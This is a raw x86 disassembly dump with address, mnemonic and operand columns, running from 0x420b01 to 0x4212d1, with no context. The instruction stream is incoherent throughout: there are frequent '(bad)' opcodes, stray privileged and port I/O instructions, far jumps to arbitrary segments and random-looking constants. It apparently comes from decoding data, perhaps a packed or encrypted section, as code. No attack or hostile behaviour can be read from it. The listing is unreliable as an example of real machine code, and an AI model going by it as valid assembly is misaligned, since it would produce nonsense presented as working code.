  420b01:	iret   
  420b02:	or     cl,dh
  420b04:	mov    BYTE PTR [edx*2-0x7cfc8d33],bh
  420b0b:	into   
  420b0c:	jne    0x420b2b
  420b0e:	outs   dx,BYTE PTR ds:[esi]
  420b0f:	sbb    bl,BYTE PTR [eax-0x54]
  420b12:	push   es
  420b13:	int3   
  420b14:	mov    esp,0x425edc2b
  420b19:	rcr    DWORD PTR [ebx+0x31cb9df2],1
  420b1f:	cli    
  420b20:	jge    0x420af5
  420b22:	lea    ebp,[ecx+0x4d]
  420b25:	add    dh,BYTE PTR ds:0xfb2a2b7b
  420b2b:	je     0x420b2c
  420b2d:	inc    edx
  420b2e:	inc    esp
  420b2f:	cmp    cl,BYTE PTR [edx+0x7ac4ca11]
  420b35:	push   ss
  420b36:	xchg   DWORD PTR [ebp+0x2d9cc0a7],edi
  420b3c:	mov    ss,edx
  420b3e:	cmp    dh,BYTE PTR [ecx]
  420b40:	add    eax,0x71a9542b
  420b45:	mov    ebx,0x5dd0e477
  420b4a:	mov    cl,0xf0
  420b4c:	imul   esi,ecx,0x78caefcd
  420b52:	mov    bl,0xbc
  420b54:	outs   dx,BYTE PTR ds:[esi]
  420b55:	(bad)  
  420b56:	dec    edx
  420b57:	(bad)  
  420b59:	jae    0x420ba3
  420b5b:	or     ecx,DWORD PTR [ecx+0x662d5d46]
  420b61:	xlat   BYTE PTR ds:[ebx]
  420b62:	test   DWORD PTR [ebx+0x78],esi
  420b65:	add    esi,ecx
  420b67:	imul   BYTE PTR [edx-0x77]
  420b6a:	sub    ebp,DWORD PTR [esi+0x24770092]
  420b70:	sub    eax,0x816f8445
  420b75:	ficom  DWORD PTR [ecx+0x4ef80d7e]
  420b7b:	shl    DWORD PTR [edx+ebx*8-0x7f],1
  420b7f:	push   edx
  420b80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420b81:	and    al,0x9d
  420b83:	mov    DWORD PTR [esi-0xe354f73],ecx
  420b89:	jle    0x420baf
  420b8b:	(bad)  
  420b8c:	les    esi,FWORD PTR [edx]
  420b8e:	cmp    eax,0x6d8312e8
  420b93:	push   0x62dcaae4
  420b98:	int3   
  420b99:	jnp    0x420b6b
  420b9b:	mov    bl,0x40
  420b9d:	js     0x420b9c
  420b9f:	xor    eax,0x243f6929
  420ba4:	and    eax,0x20f65dcd
  420ba9:	and    eax,0x6779bdc7
  420bae:	and    eax,0x2ff3c78c
  420bb3:	lahf   
  420bb4:	hlt    
  420bb5:	pop    ss
  420bb6:	xor    eax,0xa981cc69
  420bbb:	dec    edx
  420bbc:	hlt    
  420bbd:	bound  eax,QWORD PTR [esi]
  420bbf:	jbe    0x420c1d
  420bc1:	adc    DWORD PTR [ebx-0x1],esp
  420bc4:	sar    BYTE PTR [ebx+eiz*2+0x77b63410],0x5e
  420bcc:	push   ebx
  420bcd:	mov    bl,0xc8
  420bcf:	daa    
  420bd0:	dec    esi
  420bd1:	loope  0x420bfb
  420bd3:	xchg   edi,edx
  420bd5:	out    0xc,eax
  420bd7:	out    dx,eax
  420bd8:	fld    DWORD PTR [ebx-0x2faf4e26]
  420bde:	mov    esi,0x5677dc1d
  420be3:	cmp    eax,0xc59eb06
  420be8:	bound  edx,QWORD PTR [esi-0x3adf28c3]
  420bee:	aas    
  420bef:	cmp    ch,dl
  420bf1:	enter  0xa4c,0x4c
  420bf5:	fdivr  DWORD PTR [ecx+eax*1-0x31]
  420bf9:	out    0x44,al
  420bfb:	cld    
  420bfc:	mov    edi,0x76468aca
  420c01:	outs   dx,DWORD PTR ds:[esi]
  420c02:	ins    BYTE PTR es:[edi],dx
  420c03:	or     edi,DWORD PTR [eax]
  420c05:	gs mov bh,0x36
  420c08:	sub    dl,BYTE PTR [ebp+0x13a8e552]
  420c0e:	mov    edx,ebp
  420c10:	dec    edx
  420c11:	add    eax,0x710cdee1
  420c16:	or     BYTE PTR [eax-0x65449d2f],dh
  420c1c:	pop    ebx
  420c1d:	ins    BYTE PTR es:[edi],dx
  420c1e:	loope  0x420bd2
  420c20:	inc    ebp
  420c21:	or     edx,edx
  420c23:	loopne 0x420c92
  420c25:	jo     0x420bcb
  420c27:	add    eax,0x93b98606
  420c2c:	or     eax,0x7c0dbfaf
  420c31:	cwde   
  420c32:	clc    
  420c33:	jbe    0x420c80
  420c35:	and    BYTE PTR [ebp+0x4],al
  420c38:	jl     0x420c8f
  420c3a:	mov    ds:0xc03e7fc7,eax
  420c3f:	push   edi
  420c40:	pop    eax
  420c41:	xor    BYTE PTR [esi-0x34c1aada],ah
  420c47:	sbb    al,0xc4
  420c49:	sub    bh,BYTE PTR [edi]
  420c4b:	xor    eax,0x874e9177
  420c50:	(bad)  
  420c52:	ret    0xe5ee
  420c55:	xchg   DWORD PTR [eax+0x11],edi
  420c58:	shr    al,0x30
  420c5b:	repz pop edx
  420c5d:	push   es
  420c5e:	mov    al,ds:0x9a3c257c
  420c63:	mov    al,0xa1
  420c65:	jecxz  0x420c37
  420c67:	pop    es
  420c68:	repnz outs dx,DWORD PTR ds:[esi]
  420c6a:	idiv   ecx
  420c6c:	repz push 0xa8d0c443
  420c72:	jmp    0x420c9c
  420c74:	(bad)  
  420c75:	xchg   edi,eax
  420c76:	pop    ecx
  420c77:	pop    ebx
  420c78:	enter  0x670d,0xf8
  420c7c:	mov    bl,0x9a
  420c7e:	in     al,dx
  420c7f:	and    cl,dh
  420c81:	dec    ebx
  420c82:	into   
  420c83:	sbb    BYTE PTR [eax+0x50],0xe
  420c87:	pop    ds
  420c88:	cmp    bl,dh
  420c8a:	leave  
  420c8b:	and    BYTE PTR [edx+0xedc2561],ah
  420c91:	mov    edx,0x4bfb8ca4
  420c96:	sbb    bl,bh
  420c98:	adc    DWORD PTR [edx],esi
  420c9a:	cmp    eax,DWORD PTR [edx+0x72a50b4]
  420ca0:	repnz pop esi
  420ca2:	not    BYTE PTR [edx]
  420ca4:	scas   eax,DWORD PTR es:[edi]
  420ca5:	ficom  DWORD PTR [ebx+0x71]
  420ca8:	mov    esi,0xc2cd150a
  420cad:	mov    edi,0xb3785c3b
  420cb2:	sub    ah,BYTE PTR [eax]
  420cb4:	xchg   esi,eax
  420cb5:	mov    dl,0x74
  420cb7:	ins    DWORD PTR es:[edi],dx
  420cb8:	dec    ebp
  420cb9:	int3   
  420cba:	sub    bh,ch
  420cbc:	icebp  
  420cbd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420cbe:	cdq    
  420cbf:	dec    edi
  420cc0:	sbb    DWORD PTR [ebp+ecx*2-0x28],edi
  420cc4:	fbld   TBYTE PTR [ebp+0xbfc0ded]
  420cca:	push   ss
  420ccb:	dec    eax
  420ccc:	test   eax,0x58dc6d2b
  420cd1:	pop    eax
  420cd2:	push   0xffffffe2
  420cd4:	adc    ecx,DWORD PTR [ecx]
  420cd6:	push   0x9d4e2138
  420cdb:	lods   al,BYTE PTR ds:[esi]
  420cdc:	cmovno ebp,DWORD PTR [edi]
  420cdf:	add    esp,esp
  420ce1:	dec    esp
  420ce2:	test   esi,esp
  420ce4:	mov    esp,0xe10650f5
  420ce9:	ret    0x137b
  420cec:	inc    eax
  420ced:	fs icebp 
  420cef:	lods   al,BYTE PTR ds:[esi]
  420cf0:	pop    es
  420cf1:	clc    
  420cf2:	mov    es,WORD PTR [ecx+ebx*2-0x1b6d5be3]
  420cf9:	aam    0xb0
  420cfb:	dec    esi
  420cfc:	pusha  
  420cfd:	mov    ds:0x9699cbf2,ax
  420d03:	rol    BYTE PTR [ebp+0x6c6f7a46],cl
  420d09:	mov    ah,0xed
  420d0b:	icebp  
  420d0c:	loope  0x420cdc
  420d0e:	dec    eax
  420d0f:	cmp    bx,cx
  420d12:	lds    edx,FWORD PTR [esi]
  420d14:	nop
  420d15:	jmp    0xc8ac:0xf3dfe380
  420d1c:	into   
  420d1d:	pop    esp
  420d1e:	idiv   ah
  420d20:	loope  0x420d1b
  420d22:	aad    0xf0
  420d24:	add    al,0x76
  420d26:	int3   
  420d27:	xchg   bl,al
  420d29:	pop    eax
  420d2a:	inc    ebx
  420d2b:	fld    DWORD PTR [esi-0x71e78b12]
  420d31:	aaa    
  420d32:	inc    ecx
  420d33:	inc    eax
  420d34:	scas   al,BYTE PTR es:[edi]
  420d35:	pop    ss
  420d36:	jmp    0x5feb:0x225c90c8
  420d3d:	xchg   edi,eax
  420d3e:	in     al,dx
  420d3f:	cmc    
  420d40:	out    dx,al
  420d41:	ds xchg ebp,eax
  420d43:	mov    eax,0x4d654211
  420d48:	and    cl,ah
  420d4a:	mov    dl,0x68
  420d4c:	xchg   edx,ebp
  420d4e:	enter  0xea34,0x48
  420d52:	mov    cl,BYTE PTR [bx+di]
  420d55:	sbb    bl,dh
  420d57:	in     eax,0x2e
  420d59:	mov    ecx,0xb7e7d978
  420d5e:	(bad)  
  420d5f:	retf   
  420d60:	or     al,0x8a
  420d62:	and    DWORD PTR [ecx-0x25],ebx
  420d65:	aam    0xb5
  420d67:	jns    0x420d0f
  420d69:	jae    0x420d63
  420d6b:	push   eax
  420d6c:	jo     0x420cf7
  420d6e:	ret    
  420d6f:	mov    ds:0xf1732f37,eax
  420d74:	test   eax,0x4e97ee2a
  420d79:	push   ebx
  420d7a:	dec    eax
  420d7b:	or     BYTE PTR [ecx+0x5a],0x91
  420d7f:	ror    al,1
  420d81:	mov    ch,0x6e
  420d83:	ins    DWORD PTR es:[edi],dx
  420d84:	inc    esp
  420d85:	bound  ebx,QWORD PTR [ecx]
  420d87:	mov    esi,edx
  420d89:	inc    edi
  420d8a:	ja     0x420d80
  420d8c:	mov    dh,0x95
  420d8e:	jl     0x420df8
  420d90:	cmp    eax,DWORD PTR [edi-0x26]
  420d93:	mov    ebx,0xe528e02a
  420d98:	arpl   si,di
  420d9a:	mov    ebp,0x46025156
  420d9f:	(bad)  [ebx+ebp*8-0x3beee9ec]
  420da6:	(bad)  
  420da7:	push   esi
  420da8:	out    0x35,al
  420daa:	pop    edx
  420dab:	dec    eax
  420dac:	inc    edi
  420dad:	pop    edi
  420dae:	or     esp,DWORD PTR [edx+esi*8-0xb54f3f0]
  420db5:	jle    0x420e0c
  420db7:	js     0x420d76
  420db9:	mov    ds:0xc6a1f31e,al
  420dbe:	test   eax,0x3e5ae8bd
  420dc3:	shr    BYTE PTR [edi+0x41],cl
  420dc6:	cmp    dh,BYTE PTR [esi+0x6c58c393]
  420dcc:	add    ah,0x97
  420dcf:	imul   ebp,DWORD PTR [ebx-0x62],0xd1c117f3
  420dd6:	test   BYTE PTR [ecx+edx*2-0x2c],cl
  420dda:	sub    DWORD PTR [ebp-0xb],0x8ab54b3a
  420de1:	pop    ecx
  420de2:	test   al,0x68
  420de4:	mov    WORD PTR [eax-0x74],ds
  420de7:	pusha  
  420de8:	lea    ecx,[ecx-0x24]
  420deb:	mov    edi,0x7e93e450
  420df0:	lods   eax,DWORD PTR ds:[esi]
  420df1:	xchg   edx,eax
  420df2:	hlt    
  420df3:	mov    esi,0xcb300233
  420df8:	fisub  DWORD PTR [esi]
  420dfa:	sub    al,0x26
  420dfc:	xor    eax,DWORD PTR [edi+0x1b]
  420dff:	psubd  mm6,mm1
  420e02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420e03:	aas    
  420e04:	xchg   ebp,eax
  420e05:	mov    ds:0x81385532,eax
  420e0a:	mov    es,WORD PTR [edx]
  420e0c:	nop
  420e0d:	mov    edi,0x5150057a
  420e12:	cmp    BYTE PTR ds:0xb2b2c763,ah
  420e18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420e19:	stos   DWORD PTR es:[edi],eax
  420e1a:	arpl   WORD PTR [edi+0xa],bp
  420e1d:	outs   dx,BYTE PTR ds:[esi]
  420e1e:	mov    eax,ds:0xda460e0c
  420e23:	out    dx,al
  420e24:	add    DWORD PTR [esi],eax
  420e26:	repz in al,dx
  420e28:	fidivr DWORD PTR [edi+edi*8]
  420e2b:	mov    edi,0x13ed500d
  420e30:	cvttps2pi mm3,QWORD PTR [edx-0x7df1cb1e]
  420e37:	mov    ah,0x4d
  420e39:	and    ah,0x43
  420e3c:	out    dx,al
  420e3d:	test   bh,dl
  420e3f:	ins    BYTE PTR es:[edi],dx
  420e40:	push   ds
  420e41:	sbb    BYTE PTR [eax+ebp*4],dh
  420e44:	xchg   ebp,eax
  420e45:	add    bl,al
  420e47:	or     DWORD PTR [eax],ecx
  420e49:	pop    ss
  420e4a:	mov    ebx,ebp
  420e4c:	mov    ah,0x73
  420e4e:	jle    0x420e02
  420e50:	adc    al,0x98
  420e52:	adc    eax,0x84f8904d
  420e57:	jge    0x420ebb
  420e59:	out    dx,al
  420e5a:	mov    dh,0xd0
  420e5c:	das    
  420e5d:	imul   ecx,DWORD PTR [edi-0x5e],0x3e
  420e61:	or     BYTE PTR [eax-0x7ff69e5d],0x5a
  420e68:	mov    WORD PTR [edx],fs
  420e6a:	loopne 0x420e57
  420e6c:	(bad)  
  420e6d:	ficomp DWORD PTR [edx-0x542833fa]
  420e73:	xchg   ebx,eax
  420e74:	ds add eax,0xb7e61b1c
  420e7a:	loop   0x420ecd
  420e7c:	call   0x972f:0xbf4c15f2
  420e83:	aaa    
  420e84:	xor    ah,ah
  420e86:	dec    ebp
  420e87:	add    al,bl
  420e89:	ror    BYTE PTR [edx],1
  420e8b:	adc    eax,0xe8813475
  420e90:	fmul   DWORD PTR [ecx]
  420e92:	stos   BYTE PTR es:[edi],al
  420e93:	push   esp
  420e94:	jmp    0xda862424
  420e99:	test   BYTE PTR [edi],dh
  420e9b:	lds    ecx,FWORD PTR [edi]
  420e9d:	ins    DWORD PTR es:[edi],dx
  420e9e:	mov    ebp,gs
  420ea0:	fstp   DWORD PTR [esi+ecx*8+0x6894b4be]
  420ea7:	or     dl,BYTE PTR [eax+0x31]
  420eaa:	fdivrp st(5),st
  420eac:	lock mov eax,ds:0x17ded63
  420eb2:	push   0x67
  420eb4:	nop
  420eb5:	mov    ah,0xfb
  420eb7:	sbb    dh,BYTE PTR [ecx-0x55]
  420eba:	mov    dh,0x9e
  420ebc:	nop
  420ebd:	fstp   DWORD PTR [ebp-0x5870a7e2]
  420ec3:	mov    esp,0x91af8aea
  420ec8:	sub    BYTE PTR [esi],al
  420eca:	in     eax,dx
  420ecb:	lods   eax,DWORD PTR ds:[si]
  420ecd:	lds    edx,FWORD PTR [edi]
  420ecf:	mov    edx,0x90828965
  420ed4:	loop   0x420f09
  420ed6:	xor    al,0xc
  420ed8:	xor    dl,BYTE PTR [ebx+edx*8]
  420edb:	(bad)  
  420edc:	jnp    0x420f18
  420ede:	push   cs
  420edf:	dec    esi
  420ee0:	cli    
  420ee1:	aam    0xf5
  420ee3:	mov    al,0x84
  420ee5:	loope  0x420f0d
  420ee7:	inc    eax
  420ee8:	data16 or al,0x9a
  420eeb:	push   0xe354347b
  420ef0:	hlt    
  420ef1:	push   ebp
  420ef2:	shr    BYTE PTR [esi],cl
  420ef4:	test   DWORD PTR [edx+0x3f76bf67],ebx
  420efa:	fadd   st,st(5)
  420efc:	pop    ebx
  420efd:	neg    edx
  420eff:	sub    eax,0xeee330e0
  420f04:	pop    ss
  420f05:	push   edx
  420f06:	pusha  
  420f07:	or     ecx,edi
  420f09:	pop    eax
  420f0a:	(bad)  
  420f0b:	sub    edi,ebp
  420f0d:	repnz cmc 
  420f0f:	(bad)  
  420f10:	jp     0x420f7f
  420f12:	inc    ebp
  420f13:	xchg   esp,eax
  420f14:	icebp  
  420f15:	mov    esi,0x2c855c51
  420f1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420f1b:	lock inc ecx
  420f1d:	(bad)  
  420f1e:	dec    edi
  420f1f:	bound  edi,QWORD PTR [edi+0x31]
  420f22:	pusha  
  420f23:	mov    ds:0x4b25f3db,eax
  420f28:	loopne 0x420f7c
  420f2a:	aas    
  420f2b:	imul   esi,DWORD PTR [edi*1+0x5f8fa957],0x34f3377d
  420f36:	scas   eax,DWORD PTR es:[edi]
  420f37:	push   esp
  420f38:	icebp  
  420f39:	mov    WORD PTR [edx-0x34a17f40],?
  420f3f:	jo     0x420ef3
  420f41:	inc    eax
  420f42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420f43:	rcr    BYTE PTR [ecx+0x61],0xc
  420f47:	outs   dx,DWORD PTR ds:[esi]
  420f48:	cmp    DWORD PTR [eax-0x41fda029],ebp
  420f4e:	or     DWORD PTR [ebp+0x61],esi
  420f51:	je     0x420ef2
  420f53:	mov    cl,0xf7
  420f55:	mov    al,0x6c
  420f57:	es loope 0x420f74
  420f5a:	add    edi,DWORD PTR [esi]
  420f5c:	ja     0x420fa0
  420f5e:	out    0xb9,al
  420f60:	outs   dx,BYTE PTR ds:[esi]
  420f61:	xchg   edi,eax
  420f62:	call   0x80a4:0xa3bf270f
  420f69:	cmp    eax,0x73197565
  420f6e:	pusha  
  420f6f:	push   ss
  420f70:	mov    al,0xa
  420f72:	xor    al,0xa1
  420f74:	xor    edx,DWORD PTR [ecx]
  420f76:	mov    ds:0xa0f54fe0,al
  420f7b:	cld    
  420f7c:	inc    esp
  420f7d:	mov    eax,0x1d2a4ed4
  420f82:	adc    BYTE PTR [esp+esi*4+0x56],dl
  420f86:	mov    bl,0x70
  420f88:	inc    eax
  420f89:	push   es
  420f8a:	push   eax
  420f8b:	cmp    dl,BYTE PTR [ebx+edi*8+0x7302a80b]
  420f92:	cmp    eax,0x4b94ce10
  420f97:	enter  0x981c,0xea
  420f9b:	dec    esi
  420f9c:	cs jmp 0xa00a22ed
  420fa2:	jle    0x420fee
  420fa4:	lock ins BYTE PTR es:[edi],dx
  420fa6:	scas   eax,DWORD PTR es:[edi]
  420fa7:	pusha  
  420fa8:	or     eax,0xb0f46958
  420fad:	adc    DWORD PTR [ecx-0x25c7b4c4],ebp
  420fb3:	into   
  420fb4:	cs leave 
  420fb6:	sub    esi,DWORD PTR ds:0x13b77780
  420fbc:	cwde   
  420fbd:	sbb    DWORD PTR [ecx],edi
  420fbf:	scas   al,BYTE PTR es:[edi]
  420fc0:	hlt    
  420fc1:	sbb    ecx,DWORD PTR [esi-0x2c]
  420fc4:	pop    es
  420fc5:	in     eax,0x9c
  420fc7:	(bad)  
  420fc8:	adc    BYTE PTR [esi+ebp*1+0x1b84082e],dl
  420fcf:	mov    eax,0x67dee442
  420fd4:	ins    BYTE PTR es:[edi],dx
  420fd5:	and    DWORD PTR [ecx-0x5d2d385a],esp
  420fdb:	sahf   
  420fdc:	jmp    0x354e:0x64e60b4f
  420fe3:	push   edx
  420fe4:	add    bh,BYTE PTR [edi]
  420fe6:	pop    ecx
  420fe7:	dec    ecx
  420fe8:	arpl   ax,dx
  420fea:	sub    DWORD PTR [edx-0x43979e72],edi
  420ff0:	(bad)  
  420ff1:	cwde   
  420ff2:	mov    di,cs
  420ff5:	stos   BYTE PTR es:[edi],al
  420ff6:	or     DWORD PTR [edx],esp
  420ff8:	out    0x2a,eax
  420ffa:	mov    edx,0xa4d6253
  420fff:	rol    ebp,1
  421001:	adc    ch,ah
  421003:	in     eax,dx
  421004:	dec    edi
  421005:	aaa    
  421006:	sub    BYTE PTR [eax+0x2],ah
  421009:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42100a:	sub    BYTE PTR [ebp+0x706f5cfb],cl
  421010:	inc    edx
  421011:	retf   0xb19a
  421014:	xchg   BYTE PTR es:[ecx-0x2e],bl
  421018:	(bad)  
  421019:	push   esp
  42101a:	pop    esp
  42101b:	push   0xfffffff5
  42101d:	loopne 0x421074
  42101f:	jns    0x421095
  421021:	enter  0x5e40,0x62
  421025:	add    cl,dh
  421027:	jb     0x420fb8
  421029:	aaa    
  42102a:	mov    ds:0x1de8ef8b,al
  42102f:	out    dx,al
  421030:	mov    WORD PTR [ebx+0x37],ss
  421033:	jl     0x420fba
  421035:	jae    0x421064
  421037:	and    BYTE PTR [ebp-0x5d],ah
  42103a:	fcom   DWORD PTR [esi]
  42103c:	jmp    0x420fdf
  42103e:	sbb    BYTE PTR [edi-0x63],al
  421041:	in     al,dx
  421042:	inc    ebp
  421043:	stos   BYTE PTR es:[edi],al
  421044:	sub    dh,BYTE PTR [ebp+0xa78c47a]
  42104a:	enter  0x4ccc,0x42
  42104e:	pop    edx
  42104f:	dec    ebx
  421050:	js     0x421041
  421052:	bound  esi,QWORD PTR [edi]
  421054:	out    0xed,eax
  421056:	std    
  421057:	jle    0x420ffa
  421059:	xor    eax,0xfed0ba1d
  42105e:	lods   eax,DWORD PTR ds:[esi]
  42105f:	das    
  421060:	mov    al,ds:0x16e3f92c
  421065:	stos   BYTE PTR es:[edi],al
  421066:	mov    al,0xdd
  421068:	pop    ebx
  421069:	jb     0x4210ac
  42106b:	lods   al,BYTE PTR ds:[esi]
  42106c:	jecxz  0x4210e1
  42106e:	enter  0x2ab8,0x21
  421072:	es add bl,al
  421075:	(bad)  
  421076:	xor    DWORD PTR [esi+0x349ff2fd],edx
  42107c:	sub    eax,0x62b5339
  421081:	push   0x4d
  421083:	repnz out dx,eax
  421085:	mov    ebp,0xd071764c
  42108a:	xchg   esi,eax
  42108b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42108c:	xor    eax,0x50186d8
  421091:	ret    0xf079
  421094:	push   es
  421095:	dec    esi
  421096:	mov    bl,0xde
  421098:	rcr    DWORD PTR [edi-0x1d8f820e],1
  42109e:	inc    edx
  42109f:	dec    esi
  4210a0:	mov    edx,0xf58db708
  4210a5:	xor    al,0x6b
  4210a7:	sub    DWORD PTR ds:0x9737cf9a,esp
  4210ad:	adc    eax,0xd9ca604b
  4210b2:	mul    dl
  4210b4:	mov    bh,0x10
  4210b6:	leave  
  4210b7:	es xchg esp,eax
  4210b9:	ficomp WORD PTR [edi+0x73ff5e86]
  4210bf:	mov    eax,0x36253b42
  4210c4:	(bad)  
  4210c5:	adc    bh,bh
  4210c7:	push   eax
  4210c8:	xor    dh,BYTE PTR [esi+0x25]
  4210cb:	scas   eax,DWORD PTR es:[edi]
  4210cc:	sbb    ebp,ebp
  4210ce:	loopne 0x421146
  4210d0:	gs mov edx,0x6fd3b31a
  4210d6:	xchg   DWORD PTR ds:0x95043afb,ebp
  4210dc:	cld    
  4210dd:	(bad)  
  4210de:	ja     0x4210e0
  4210e0:	gs call 0xce:0xd9d2041
  4210e8:	jp     0x421122
  4210ea:	xor    ecx,0x12
  4210ed:	push   ss
  4210ee:	loopne 0x421089
  4210f0:	bound  esi,QWORD PTR ss:[esi-0x71c71661]
  4210f7:	dec    edi
  4210f8:	dec    ecx
  4210f9:	mov    eax,0x3963949c
  4210fe:	into   
  4210ff:	clc    
  421100:	sbb    cl,BYTE PTR [esi-0x1]
  421103:	call   0xa663f05d
  421108:	(bad)  [ebp-0x78]
  42110b:	xor    eax,0x10ff84c7
  421110:	or     esi,0x646552fc
  421116:	imul   ebx,edi,0x6b
  421119:	mov    esi,0x581eac60
  42111e:	and    BYTE PTR [edi],bh
  421120:	aaa    
  421121:	out    0x56,eax
  421123:	out    0xf4,eax
  421125:	or     eax,0x1a70bd3a
  42112a:	inc    edi
  42112b:	adc    ch,BYTE PTR [edi+0x6b]
  42112e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42112f:	inc    eax
  421130:	out    0xa0,eax
  421132:	xchg   DWORD PTR [esi-0x5],eax
  421135:	mov    bh,0x48
  421137:	mov    DWORD PTR ds:0xfefc1c2f,edi
  42113d:	lahf   
  42113e:	mov    dl,0x97
  421140:	push   cs
  421141:	lahf   
  421142:	into   
  421143:	inc    esp
  421144:	add    al,0xd
  421146:	dec    edi
  421147:	pop    ecx
  421148:	sbb    al,0x83
  42114a:	fmul   QWORD PTR [esi-0x7621a7da]
  421150:	xchg   esi,eax
  421151:	out    dx,eax
  421152:	icebp  
  421153:	sub    eax,0xf227a1fa
  421158:	add    bh,BYTE PTR [ebp-0x11]
  42115b:	js     0x4210e8
  42115d:	(bad)  
  42115e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42115f:	and    ecx,DWORD PTR [edi-0xc]
  421162:	sbb    al,BYTE PTR [ecx+eiz*4-0x2b]
  421166:	sbb    ebp,0x6c6d35a3
  42116c:	or     ch,al
  42116e:	mov    esp,0xa22e68c4
  421173:	mov    bh,0x7b
  421175:	xlat   BYTE PTR ds:[ebx]
  421176:	iret   
  421177:	and    BYTE PTR [edx-0x29],dh
  42117a:	push   esp
  42117b:	xor    DWORD PTR [esp+edx*4],ebp
  42117e:	push   es
  42117f:	push   ecx
  421180:	popa   
  421181:	jne    0x4211a3
  421183:	in     eax,dx
  421184:	pop    ecx
  421185:	lods   al,BYTE PTR ds:[esi]
  421186:	or     DWORD PTR [edx-0x44],0x29
  42118a:	mov    cl,BYTE PTR [edi]
  42118c:	mov    dh,0x9e
  42118e:	aad    0x24
  421190:	jmp    0x421207
  421192:	call   edi
  421194:	enter  0x2cd,0x28
  421198:	push   ss
  421199:	xchg   ecx,eax
  42119a:	ffree  st(5)
  42119c:	popf   
  42119d:	out    0xcc,al
  42119f:	std    
  4211a0:	call   0xb644:0xf1db0e5f
  4211a7:	mov    ds:0x5c870c84,al
  4211ac:	sbb    BYTE PTR [eax-0x16652aae],ch
  4211b2:	aad    0xa0
  4211b4:	push   ss
  4211b5:	jo     0x42115b
  4211b7:	test   BYTE PTR ds:0x1bcb2a95,ah
  4211bd:	into   
  4211be:	or     esp,DWORD PTR [eax+0x487fce83]
  4211c4:	lods   al,BYTE PTR ds:[esi]
  4211c5:	hlt    
  4211c6:	xchg   esp,eax
  4211c7:	jmp    0x421214
  4211c9:	loope  0x42119a
  4211cb:	scas   al,BYTE PTR es:[edi]
  4211cc:	dec    esp
  4211cd:	pop    edi
  4211ce:	lods   al,BYTE PTR ds:[esi]
  4211cf:	cmp    BYTE PTR [eax+0x29ab36aa],bl
  4211d5:	rcr    DWORD PTR [ebx],0x25
  4211d8:	ss dec edi
  4211da:	setns  BYTE PTR [ebp+0x26f318b5]
  4211e1:	and    ebx,DWORD PTR [edx+0x4e]
  4211e4:	add    DWORD PTR [esi+0x3cb5f091],eax
  4211ea:	mov    ch,0xca
  4211ec:	and    DWORD PTR [eax-0x48a10843],0x7d
  4211f3:	jne    0x421250
  4211f5:	stc    
  4211f6:	(bad)  
  4211f7:	iret   
  4211f8:	(bad)  
  4211f9:	ins    BYTE PTR es:[edi],dx
  4211fa:	pushf  
  4211fb:	jl     0x421199
  4211fd:	pop    esp
  4211fe:	sahf   
  4211ff:	lods   al,BYTE PTR ds:[esi]
  421200:	add    DWORD PTR [ebx+eax*1+0xdcb135c],0xdb72ec10
  42120b:	adc    eax,0x202f9369
  421210:	gs daa 
  421212:	lock into 
  421214:	push   ecx
  421215:	sub    bl,BYTE PTR [ebp+0x28d96c20]
  42121b:	jo     0x4211f8
  42121d:	jg     0x421275
  42121f:	js     0x421250
  421221:	call   0x341f50aa
  421226:	out    dx,eax
  421227:	out    dx,al
  421228:	(bad)  
  421229:	iret   
  42122a:	loopne 0x421255
  42122c:	in     eax,0xc0
  42122e:	xor    esp,ebp
  421230:	repz push 0xffffffb9
  421233:	aas    
  421234:	inc    ebx
  421235:	inc    edi
  421236:	leave  
  421237:	mov    eax,0x6d9ae268
  42123c:	push   ss
  42123d:	push   ss
  42123e:	xchg   ebp,eax
  42123f:	stos   BYTE PTR es:[edi],al
  421240:	(bad)  
  421242:	push   ebx
  421243:	add    al,0xd4
  421245:	jmp    0xc7c9a3ca
  42124a:	xchg   BYTE PTR [edi],ah
  42124c:	mov    esi,0x511d8225
  421251:	cld    
  421252:	lods   al,BYTE PTR ds:[esi]
  421253:	push   ss
  421254:	or     BYTE PTR [eax],bh
  421256:	adc    bh,ah
  421258:	into   
  421259:	add    esi,edx
  42125b:	jno    0x42126b
  42125d:	mov    ch,BYTE PTR [eax-0x67]
  421260:	imul   ecx,ebp,0x36fc29af
  421266:	shl    DWORD PTR [ebx+0x541190ef],cl
  42126c:	sub    ecx,ebx
  42126e:	rcr    BYTE PTR [edi+0x6ccde2a5],0xed
  421275:	test   edi,edi
  421277:	xchg   ebp,eax
  421278:	and    esp,DWORD PTR [ebx]
  42127a:	fdivr  DWORD PTR [ebp-0x19]
  42127d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42127e:	mov    edx,0xac436cd0
  421283:	rol    DWORD PTR [edx-0x387a4a4e],1
  421289:	mov    ch,0xf
  42128b:	sbb    al,0xb1
  42128d:	xchg   edi,eax
  42128e:	or     eax,0xa88cc2a4
  421293:	push   ss
  421294:	loop   0x42122c
  421296:	mov    edi,edx
  421298:	inc    ecx
  421299:	pop    esi
  42129a:	imul   ebx,ecx,0xffffffcb
  42129d:	das    
  42129e:	cmp    ebp,DWORD PTR [eax]
  4212a0:	jno    0x42129b
  4212a2:	(bad)  
  4212a4:	add    DWORD PTR [esi+0x6e],eax
  4212a7:	xor    al,0x8
  4212a9:	sti    
  4212aa:	mov    ah,0x26
  4212ac:	icebp  
  4212ad:	pop    ebx
  4212ae:	(bad)  
  4212af:	jl     0x42124f
  4212b1:	inc    edi
  4212b2:	lods   eax,DWORD PTR ds:[esi]
  4212b3:	mov    esp,0x672eda7f
  4212b8:	fs dec ecx
  4212ba:	leave  
  4212bb:	iret   
  4212bc:	jge    0x42131c
  4212be:	lods   eax,DWORD PTR cs:[esi]
  4212c0:	imul   bl
  4212c2:	scas   eax,DWORD PTR es:[edi]
  4212c3:	sub    dh,dh
  4212c5:	inc    ebx
  4212c6:	fucompp 
  4212c8:	mov    BYTE PTR [esi],ch
  4212ca:	pop    ebx
  4212cb:	mov    al,ds:0xeda4feb8
  4212d0:	pop    ebp
  4212d1:	sub    ch,ah
